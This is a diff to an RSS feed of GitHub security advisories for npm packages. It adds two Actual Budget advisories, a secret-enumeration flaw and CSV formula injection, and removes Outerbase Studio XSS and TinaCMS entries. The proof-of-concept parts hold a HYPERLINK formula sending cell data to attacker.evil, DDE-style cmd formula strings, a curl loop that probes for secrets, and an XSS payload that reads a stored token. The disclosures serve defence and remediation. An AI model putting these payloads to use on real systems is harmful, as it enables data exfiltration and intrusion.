@@ -2,7 +2,7 @@
 <feed xmlns="http://www.w3.org/2005/Atom">
     <id>https://azu.github.io/github-advisory-database-rss/npm.rss</id>
     <title>Security Advisory for JavaScript packages hosted at npmjs.com</title>
-    <updated>2026-06-22T21:40:05.052Z</updated>
+    <updated>2026-06-22T22:31:12.684Z</updated>
     <generator>github-advisory-database-rss</generator>
     <link rel="alternate" href="https://github.com/advisories?query=type%3Areviewed+ecosystem%3Anpm"/>
     <subtitle>Security Advisory for JavaScript packages hosted at npmjs.com on GitHub</subtitle>
@@ -11,6 +11,248 @@
     <category term="HIGH"/>
     <category term="MODERATE"/>
     <category term="LOW"/>
+    <entry>
+        <title type="html"><![CDATA[[@actual-app/sync-server] @actual-app/sync-server's missing authorization on GET /secret/:name allows non-admin OpenID users to enumerate admin-configured bank-sync secrets]]></title>
+        <id>https://github.com/advisories/GHSA-3f62-qv96-4p78</id>
+        <link href="https://github.com/advisories/GHSA-3f62-qv96-4p78"/>
+        <updated>2026-06-22T21:42:36.000Z</updated>
+        <content type="html"><![CDATA[<h2 id="summary">Summary</h2>
+<p>In <code>@actual-app/sync-server</code>, the <code>GET /secret/:name</code> endpoint (<code>app-secrets.js:53</code>) checks only that the caller has a valid session — it does not verify the caller is an admin. The sibling <code>POST /secret/</code> handler does enforce an admin check in OpenID mode, exposing an authorization asymmetry. Any authenticated non-admin (BASIC) user in OpenID multi-user deployments can probe the secrets store and learn which admin-managed bank-sync integrations have been configured (existence, not values). This includes integration credentials that are not otherwise observable to non-admins, such as <code>simplefin_accessKey</code>, <code>pluggyai_clientSecret</code>, <code>pluggyai_itemIds</code>, and the <code>gocardless_*</code> secrets.</p>
+<h2 id="details">Details</h2>
+<p><code>packages/sync-server/src/app-secrets.js</code> mounts <code>validateSessionMiddleware</code> at the router level (line 15), so all handlers inherit only "must be authenticated." The POST handler then explicitly upgrades to an admin check when the active auth method is <code>openid</code>:</p>
+<pre><code class="language-js">// app-secrets.js:17-46
+app.post('/', async (req, res) =&gt; {
+  // ... look up active auth method ...
+  if (method === 'openid') {
+    const canSaveSecrets = isAdmin(res.locals.user_id);
+    if (!canSaveSecrets) {
+      res.status(403).send({
+        status: 'error',
+        reason: 'not-admin',
+        details: 'You have to be admin to set secrets',
+      });
+      return;
+    }
+  }
+  secretsService.set(name, value);
+  // ...
+});
+</code></pre>
+<p>The sibling GET handler skips both the method check and the admin check entirely:</p>
+<pre><code class="language-js">// app-secrets.js:53-61
+app.get('/:name', async (req, res) =&gt; {
+  const name = req.params.name;
+  const keyExists = secretsService.exists(name);
+  if (keyExists) {
+    res.sendStatus(204);
+  } else {
+    res.status(404).send('key not found');
+  }
+});
+</code></pre>
+<p>The intent — visible from the POST handler's "You have to be admin to set secrets" — is that this store holds admin-managed credentials. The valid secret names enumerated in <code>services/secrets-service.js</code> (<code>SecretName</code>) are: <code>gocardless_secretId</code>, <code>gocardless_secretKey</code>, <code>simplefin_token</code>, <code>simplefin_accessKey</code>, <code>pluggyai_clientId</code>, <code>pluggyai_clientSecret</code>, <code>pluggyai_itemIds</code>.</p>
+<p>In OpenID mode, BASIC users obtain valid sessions through <code>packages/sync-server/src/accounts/openid.ts:264-274</code> — either auto-created (<code>userCreationMode=login</code>) or pre-provisioned by the admin (<code>userCreationMode=manual</code>). With that BASIC session token they can hit <code>GET /secret/:name</code> and distinguish 204 (configured) from 404 (missing), enumerating each admin-managed secret name. Some signals (<code>simplefin_token</code> existence, <code>pluggyai_clientId</code> existence) are already coarsely observable via the unauthenticated bank-sync status endpoints (<code>app-simplefin.js:18</code>, <code>app-pluggyai.js:18</code>); the rest (<code>simplefin_accessKey</code>, <code>pluggyai_clientSecret</code>, <code>pluggyai_itemIds</code>, both <code>gocardless_*</code> secrets) are not otherwise probeable.</p>
+<p>This is structurally identical to the previously reported missing-admin-check on <code>GET /admin/users/</code> (<code>app-admin.js:28</code>): a POST sibling enforces admin authorization while the GET sibling omits it.</p>
+<h2 id="poc">PoC</h2>
+<p>Pre-requisites:</p>
+<ul>
+<li>Server is configured for OpenID multi-user mode (<code>ACTUAL_OPENID_ENFORCE=true</code> or auth method is <code>openid</code>).</li>
+<li>An admin has configured one or more bank-sync integrations.</li>
+<li>The attacker is any authenticated BASIC user (auto-created via <code>userCreationMode=login</code>, or admin-provisioned in the default <code>manual</code> mode).</li>
+</ul>
+<p>Step 1 — capture a BASIC user's session token in <code>$TOKEN</code> (standard OpenID login flow, no admin role required).</p>
+<p>Step 2 — probe each admin-managed secret name:</p>
+<pre><code class="language-bash">for name in gocardless_secretId gocardless_secretKey \
+            simplefin_token simplefin_accessKey \
+            pluggyai_clientId pluggyai_clientSecret pluggyai_itemIds; do
+  status=$(curl -s -o /dev/null -w '%{http_code}' \
+           -H "X-ACTUAL-TOKEN: $TOKEN" \
+           https://actual.example.com/secret/$name)
+  echo "$name -&gt; $status"   # 204 = configured, 404 = missing
+done
+</code></pre>
+<p>Step 3 — confirm the asymmetry by attempting to write a secret (correctly rejected for non-admins):</p>
+<pre><code class="language-bash">curl -s -H "X-ACTUAL-TOKEN: $TOKEN" \
+     -H 'Content-Type: application/json' \
+     -d '{"name":"pluggyai_itemIds","value":"x"}' \
+     https://actual.example.com/secret/
+# {"status":"error","reason":"not-admin","details":"You have to be admin to set secrets"}
+</code></pre>
+<p>The POST returns 403 <code>not-admin</code>; the GET returns 204/404 unauthenticated-against-role.</p>
+<h2 id="impact">Impact</h2>
+<ul>
+<li>A non-admin authenticated user in OpenID multi-user mode can enumerate which admin-managed bank-sync integrations the deployment uses.</li>
+<li>This reveals whether GoCardless, SimpleFIN, and/or Pluggy AI are configured, and which auxiliary credentials the admin has set (e.g. <code>simplefin_accessKey</code>, <code>pluggyai_clientSecret</code>, <code>pluggyai_itemIds</code>) — none of which are otherwise observable to non-admins.</li>
+<li>The disclosure is existence-only; secret values are not returned. Impact is limited to recon useful for targeted follow-on attacks (e.g. credential phishing, picking which integration to attack on a separate vulnerability).</li>
+<li>No integrity or availability impact.</li>
+</ul>
+<h2 id="recommended-fix">Recommended Fix</h2>
+<p>Mirror the POST handler's admin gate on the GET handler. Minimal patch in <code>packages/sync-server/src/app-secrets.js</code>:</p>
+<pre><code class="language-js">app.get('/:name', async (req, res) =&gt; {
+  let method;
+  try {
+    const result = getAccountDb().first(
+      'SELECT method FROM auth WHERE active = 1',
+    );
+    method = result?.method;
+  } catch (error) {
+    console.error('Failed to fetch auth method:', error);
+    return res.status(500).send({
+      status: 'error',
+      reason: 'database-error',
+      details: 'Failed to validate authentication method',
+    });
+  }
+
+  if (method === 'openid' &amp;&amp; !isAdmin(res.locals.user_id)) {
+    return res.status(403).send({
+      status: 'error',
+      reason: 'not-admin',
+      details: 'You have to be admin to read secret status',
+    });
+  }
+
+  const name = req.params.name;
+  const keyExists = secretsService.exists(name);
+  if (keyExists) {
+    res.sendStatus(204);
+  } else {
+    res.status(404).send('key not found');
+  }
+});
+</code></pre>
+<p>Consider factoring the method-lookup + admin-check into a shared helper used by both POST and GET to prevent the same asymmetry from recurring. Also consider restricting <code>:name</code> to the <code>SecretName</code> enum so unrelated probing is rejected up front.</p>
+<h3 id="references">References</h3>
+<ul>
+<li><a href="https://github.com/actualbudget/actual/security/advisories/GHSA-3f62-qv96-4p78">https://github.com/actualbudget/actual/security/advisories/GHSA-3f62-qv96-4p78</a></li>
+<li><a href="https://github.com/advisories/GHSA-3f62-qv96-4p78">https://github.com/advisories/GHSA-3f62-qv96-4p78</a></li>
+</ul>
+]]></content>
+        <author>
+            <name>GitHub</name>
+            <email>GitHub@noreply.github.com</email>
+            <uri>https://github.com/advisories/GHSA-3f62-qv96-4p78</uri>
+        </author>
+        <category label="severity" term="MODERATE"/>
+        <published>2026-06-22T21:42:34.000Z</published>
+    </entry>
+    <entry>
+        <title type="html"><![CDATA[[@actual-app/cli] @actual-app/cli `--format csv` Output Vulnerable to CSV Formula Injection via Custom `escapeCsv` Helper]]></title>
+        <id>https://github.com/advisories/GHSA-7gh7-258j-4mpq</id>
+        <link href="https://github.com/advisories/GHSA-7gh7-258j-4mpq"/>
+        <updated>2026-06-22T21:42:17.000Z</updated>
+        <content type="html"><![CDATA[<h2 id="summary">Summary</h2>
+<p><code>@actual-app/cli</code> ships a hand-rolled CSV serializer in <code>packages/cli/src/output.ts</code> (used whenever the global <code>--format csv</code> option is passed) whose <code>escapeCsv</code> helper only handles RFC 4180 delimiter/quote/newline escaping. It does <strong>not</strong> neutralize the standard CSV formula-injection prefixes (<code>=</code>, <code>+</code>, <code>-</code>, <code>@</code>, <code>\t</code>, <code>\r</code>). Any CLI command that streams an object array containing user-controlled strings — <code>transactions list</code>, <code>accounts list</code>, <code>payees list</code>, <code>categories list</code>, <code>tags list</code>, <code>category-groups list</code>, <code>rules list</code>, <code>schedules list</code>, <code>query</code> — will emit cells that auto-evaluate when the resulting CSV is opened in Excel, LibreOffice Calc, or Google Sheets, enabling data exfiltration (<code>=HYPERLINK(...)</code>, <code>=WEBSERVICE(...)</code>) and arbitrary formula execution.</p>
+<p>This is a <strong>distinct variant</strong> of the formula-injection surface in <code>packages/loot-core/src/server/transactions/export/export-to-csv.ts</code> (which uses <code>csv-stringify</code> and would need a separate <code>cast</code> option fix) — they are different files, different packages, and different serializers. Fixing one does not fix the other.</p>
+<h2 id="details">Details</h2>
+<h3 id="vulnerable-code">Vulnerable code</h3>
+<p><code>packages/cli/src/output.ts:98-103</code>:</p>
+<pre><code class="language-ts">function escapeCsv(value: string): string {
+  if (value.includes(',') || value.includes('"') || value.includes('\n')) {
+    return '"' + value.replace(/"/g, '""') + '"';
+  }
+  return value;
+}
+</code></pre>
+<p>The helper performs only delimiter/quote/newline neutralization, which is sufficient for RFC 4180 <em>parsing</em> but irrelevant to spreadsheet <em>formula evaluation</em>. CSV double-quoting is invisible to Excel/Calc/Sheets — the unquoted cell value <code>=HYPERLINK("http://attacker/?d="&amp;B2,"Click")</code> is still parsed as a formula by the spreadsheet, even when wrapped as <code>"=HYPERLINK(""http://attacker/?d=""&amp;B2,""Click"")"</code> on disk.</p>
+<h3 id="data-flow-to-the-sink">Data flow to the sink</h3>
+<ol>
+<li>The global <code>--format</code> option is registered at <code>packages/cli/src/index.ts:53-57</code> with <code>choices(['json','table','csv'])</code> and applies to every subcommand.</li>
+<li>List/query subcommands invoke <code>printOutput(data, format)</code> (<code>output.ts:105-107</code>), which routes <code>format === 'csv'</code> to <code>formatCsv</code> (<code>output.ts:71-96</code>).</li>
+<li>For each row, every column is run through <code>formatCellValue</code> (<code>output.ts:21-26</code>):<pre><code class="language-ts">function formatCellValue(key: string, value: unknown): string {
+  if (isAmountValue(key, value)) {
+    return (value / 100).toFixed(2);
+  }
+  return String(value ?? '');
+}
+</code></pre>
+Only the fixed <code>AMOUNT_FIELDS</code> set (<code>amount</code>, <code>balance</code>, <code>budgeted</code>, etc.) gets numeric coercion. User-controlled string fields — <code>payee.name</code>, <code>account.name</code>, <code>category.name</code>, <code>notes</code>, tag names, rule descriptions, schedule names — are passed verbatim to <code>escapeCsv</code>.</li>
+<li><code>escapeCsv</code> returns the value unmodified unless it contains <code>,</code>, <code>"</code>, or <code>\n</code>. A payload such as <code>=1+1</code>, <code>@SUM(...)</code>, <code>+1+cmd|'/c calc'!A0</code>, or <code>-2+3+cmd|'/c calc'!A0</code> therefore lands in the output as a leading-character formula.</li>
+</ol>
+<h3 id="exploitability-conditions">Exploitability conditions</h3>
+<ul>
+<li>The CLI is installed and used by the victim (<code>@actual-app/cli</code> is published with <code>"bin": { "actual": "./dist/cli.js", "actual-cli": "./dist/cli.js" }</code>).</li>
+<li>The attacker can persist a malicious string in any user-controlled field of the budget. Realistic vectors:<ul>
+<li>Co-user / co-collaborator of a synced budget (multi-device, or attacker-controlled sync server).</li>
+<li>Sending the victim a crafted OFX/QIF/CSV import file.</li>
+<li>API write access (e.g., over a compromised sync session).</li>
+</ul>
+</li>
+<li>The victim runs <code>actual &lt;list-cmd&gt; --format csv &gt; out.csv</code> and opens <code>out.csv</code> in a spreadsheet program. CSV files generated locally by the CLI are not gated by Office Protected View / Mark-of-the-Web, so formulas evaluate immediately.</li>
+</ul>
+<p>There are <strong>no mitigations</strong> in the code path: no allowlist, no sanitizer, no <code>cast</code> option, no warning, and the CLI is shipped to end users via npm.</p>
+<h2 id="poc">PoC</h2>
+<p>Setup (one-time — choose any user-controlled field; payee shown):</p>
+<pre><code class="language-bash"># Inject via the CLI's own write path (or via OFX/QIF/CSV import, or shared sync):
+actual transactions add \
+  --account "$ACCOUNT_ID" \
+  --data '[{"payee_name":"=HYPERLINK(\"http://attacker.evil/leak?d=\"&amp;B2,\"Bank refund\")","date":"2026-01-01","amount":10000}]'
+</code></pre>
+<p>Trigger (victim runs):</p>
+<pre><code class="language-bash">actual transactions list --account "$ACCOUNT_ID" --start 2026-01-01 --end 2026-12-31 --format csv &gt; out.csv
+cat out.csv
+</code></pre>
+<p>Observed output (abridged; quoting is RFC 4180-correct but the formula prefix is preserved):</p>
+<pre><code>id,date,amount,payee,notes,category,account,cleared,reconciled
+abc...,2026-01-01,100.00,"=HYPERLINK(""http://attacker.evil/leak?d=""&amp;B2,""Bank refund"")",,,Checking,false,false
+</code></pre>
+<p>Open <code>out.csv</code> in Excel / LibreOffice Calc / Google Sheets → the <code>payee</code> cell renders as a clickable hyperlink that, when clicked (or auto-fetched in some configurations), exfiltrates neighboring cell content (<code>B2</code> = the date, but trivially adjustable to any cell) to the attacker.</p>
+<p>Minimal-payload variants that bypass <code>escapeCsv</code> entirely (no <code>,</code>, <code>"</code>, or <code>\n</code> → no quoting at all):</p>
+<ul>
+<li>Payee name <code>=1+1</code> → cell shows <code>2</code>.</li>
+<li>Payee name <code>@SUM(1+1)</code> → cell shows <code>2</code>.</li>
+<li>Payee name <code>+1+1</code> → cell shows <code>2</code>.</li>
+<li>Payee name <code>-2+3</code> → cell shows <code>1</code>.</li>
+</ul>
+<p>The same applies to other list commands sharing the global <code>--format</code> option:</p>
+<pre><code class="language-bash">actual accounts list   --format csv      # account.name
+actual payees   list   --format csv      # payee.name
+actual categories list --format csv      # category.name
+actual tags list       --format csv
+actual category-groups list --format csv
+actual rules list      --format csv
+actual schedules list  --format csv
+actual query "..."     --format csv
+</code></pre>
+<p>Verified by reading <code>escapeCsv</code> (<code>packages/cli/src/output.ts:98-103</code>): the only escape triggers are <code>,</code>, <code>"</code>, <code>\n</code>, and even when triggered the leading character is preserved.</p>
+<h2 id="impact">Impact</h2>
+<ul>
+<li><strong>Data exfiltration</strong> in the victim's spreadsheet context via <code>=HYPERLINK(...)</code>, <code>=WEBSERVICE(...)</code>, <code>=IMPORTXML(...)</code> (Sheets), <code>=IMPORTDATA(...)</code> (Sheets) — typically one click for HYPERLINK, fully automatic for WEBSERVICE/IMPORT* on confirmation. Victim's financial data (account names, balances, transactions in adjacent cells) is the natural exfil target.</li>
+<li><strong>Arbitrary formula execution</strong> in the victim's spreadsheet context, including legacy DDE-style payloads on outdated Excel installations (potential RCE).</li>
+<li><strong>Trust-boundary crossing</strong>: financial data the victim assumes is "exported" becomes attacker-controlled active content. The CLI is the victim's own trusted tool; users do not expect <code>actual transactions list --format csv</code> to produce a file that runs code.</li>
+</ul>
+<p>Blast radius is bounded by the requirement that the attacker plant a string in a user-controlled field and the victim opens the CSV in a spreadsheet — but both are realistic for a personal-finance app whose primary export workflow is "open in Excel".</p>
+<h2 id="recommended-fix">Recommended Fix</h2>
+<p>Neutralize formula-trigger prefixes in <code>escapeCsv</code> <em>before</em> the existing RFC 4180 quoting. Example:</p>
+<pre><code class="language-ts">// packages/cli/src/output.ts
+const FORMULA_TRIGGERS = /^[=+\-@\t\r]/;
+
+function escapeCsv(value: string): string {
+  // Neutralize spreadsheet formula prefixes (CWE-1236).
+  if (FORMULA_TRIGGERS.test(value)) {
+    value = "'" + value;
+  }
+  if (value.includes(',') || value.includes('"') || value.includes('\n')) {
+    return '"' + value.replace(/"/g, '""') + '"';
+  }
+  return value;
+}
+</code></pre>
+<p>The leading single-quote is the OWASP-recommended neutralizer: it is stripped by Excel/Calc on display but prevents formula evaluation. Apply the same fix in <code>packages/loot-core/src/server/transactions/export/export-to-csv.ts</code> by passing a <code>cast</code> option to <code>csv-stringify</code> that prepends <code>'</code> to any string starting with a formula trigger — the two sites are independent and both must be patched.</p>
+<h3 id="references">References</h3>
+<ul>
+<li><a href="https://github.com/actualbudget/actual/security/advisories/GHSA-7gh7-258j-4mpq">https://github.com/actualbudget/actual/security/advisories/GHSA-7gh7-258j-4mpq</a></li>
+<li><a href="https://github.com/advisories/GHSA-7gh7-258j-4mpq">https://github.com/advisories/GHSA-7gh7-258j-4mpq</a></li>
+</ul>
+]]></content>
+        <author>
+            <name>GitHub</name>
+            <email>GitHub@noreply.github.com</email>
+            <uri>https://github.com/advisories/GHSA-7gh7-258j-4mpq</uri>
+        </author>
+        <category label="severity" term="MODERATE"/>
+        <published>2026-06-22T21:42:15.000Z</published>
+    </entry>
     <entry>
         <title type="html"><![CDATA[[http-proxy-middleware] http-proxy-middleware `router` host+path substring matching allows Host-header-driven backend routing bypass]]></title>
         <id>https://github.com/advisories/GHSA-64mm-vxmg-q3vj</id>
@@ -2951,72 +3193,5 @@ TS
         </author>
         <category label="severity" term="MODERATE"/>
         <published>2026-06-19T06:31:56.000Z</published>
-    </entry>
-    <entry>
-        <title type="html"><![CDATA[[@outerbase/studio] Outerbase Studio: Stored XSS in Text Widget Leads to Authentication Token Exposure]]></title>
-        <id>https://github.com/advisories/GHSA-wwf9-7jrc-rv4q</id>
-        <link href="https://github.com/advisories/GHSA-wwf9-7jrc-rv4q"/>
-        <updated>2026-06-19T21:18:46.000Z</updated>
-        <content type="html"><![CDATA[<h2 id="summary">Summary</h2>
-<p>A Stored Cross-Site Scripting (XSS) issue previously existed in the Text Widget in Board of Outerbase Studio where unsanitized HTML could be rendered using <code>dangerouslySetInnerHTML</code></p>
-<h3 id="steps-to-reproduce">Steps to Reproduce</h3>
-<ol>
-<li>Create a new dashboard.</li>
-<li>Add a <strong>Text widget</strong>.</li>
-<li>Insert the following payload:</li>
-</ol>
-<pre><code class="language-html">&lt;img src=x onerror="alert('XSS Executed\nToken: ' + localStorage.getItem('ob-token'))"&gt;
-</code></pre>
-<h3 id="architectural-context">Architectural Context</h3>
-<p>Outerbase Cloud and its backend services were discontinued in 2025.</p>
-<p>The current version of Outerbase Studio operates purely as a client-side application, with dashboard data stored locally in the browser.</p>
-<h3 id="impact">Impact</h3>
-<p>In the current architecture, the impact is limited to local self-XSS within a user's browser session.
-The previously described scenarios involving:</p>
-<ul>
-<li>authentication token theft</li>
-<li>account takeover</li>
-<li>database access</li>
-</ul>
-<p>are no longer applicable since there are no active backend services or authentication tokens.</p>
-<h3 id="remediation">Remediation</h3>
-<p>The unsafe HTML rendering in the Text Widget has been removed in commit <a href="https://github.com/outerbase/studio/commit/b06fb85e5967440278d5a815721b360920566ab9">https://github.com/outerbase/studio/commit/b06fb85e5967440278d5a815721b360920566ab9</a> by eliminating the use of dangerouslySetInnerHTML.</p>
-<h3 id="references">References</h3>
-<ul>
-<li><a href="https://github.com/outerbase/studio/security/advisories/GHSA-wwf9-7jrc-rv4q">https://github.com/outerbase/studio/security/advisories/GHSA-wwf9-7jrc-rv4q</a></li>
-<li><a href="https://github.com/outerbase/studio/commit/b06fb85e5967440278d5a815721b360920566ab9">https://github.com/outerbase/studio/commit/b06fb85e5967440278d5a815721b360920566ab9</a></li>
-<li><a href="https://github.com/advisories/GHSA-wwf9-7jrc-rv4q">https://github.com/advisories/GHSA-wwf9-7jrc-rv4q</a></li>
-</ul>
-]]></content>
-        <author>
-            <name>GitHub</name>
-            <email>GitHub@noreply.github.com</email>
-            <uri>https://github.com/advisories/GHSA-wwf9-7jrc-rv4q</uri>
-        </author>
-        <category label="severity" term="MODERATE"/>
-        <published>2026-06-19T21:18:44.000Z</published>
-    </entry>
-    <entry>
-        <title type="html"><![CDATA[[@tinacms/app] TinaCMS: Cross-origin postMessage handlers and rich-text URL-sanitization bypass enable stored XSS and session takeover]]></title>
-        <id>https://github.com/advisories/GHSA-g5qx-h5f3-mp2f</id>
-        <link href="https://github.com/advisories/GHSA-g5qx-h5f3-mp2f"/>
-        <updated>2026-06-19T21:15:29.000Z</updated>
-        <content type="html"><![CDATA[<p>TinaCMS registers window message listeners — the useTina overlay handler, the OAuth authentication popup handler, and the admin↔preview iframe GraphQL reducer — that act on event.data without verifying event.origin or event.source, and post messages using non-specific target origins. A page the victim visits (or a window in an opener/iframe relationship with a Tina admin) can forge messages to drive the editor, inject preview content, or observe/forge the OAuth popup channel to take over an authenticated editing session.</p>
-<p>Fixed in <a href="https://github.com/tinacms/tinacms/pull/7056">#7056</a> by allow-listing trusted origins and verifying event.source (isFromAdmin, isFromTrustedPreviewOrigin), and by posting only to explicit target origins (never "*").</p>
-<p>Note: the rich-text URL-sanitization issue previously bundled here has been split into its own advisory (GHSA-2vcc-5v34-9jc8) so each vulnerability can receive a distinct CVE.</p>
-<h3 id="references">References</h3>
-<ul>
-<li><a href="https://github.com/tinacms/tinacms/security/advisories/GHSA-g5qx-h5f3-mp2f">https://github.com/tinacms/tinacms/security/advisories/GHSA-g5qx-h5f3-mp2f</a></li>
-<li><a href="https://github.com/tinacms/tinacms/pull/7056">https://github.com/tinacms/tinacms/pull/7056</a></li>
-<li><a href="https://github.com/advisories/GHSA-g5qx-h5f3-mp2f">https://github.com/advisories/GHSA-g5qx-h5f3-mp2f</a></li>
-</ul>
-]]></content>
-        <author>
-            <name>GitHub</name>
-            <email>GitHub@noreply.github.com</email>
-            <uri>https://github.com/advisories/GHSA-g5qx-h5f3-mp2f</uri>
-        </author>
-        <category label="severity" term="HIGH"/>
-        <published>2026-06-19T21:15:29.000Z</published>
     </entry>
 </feed>
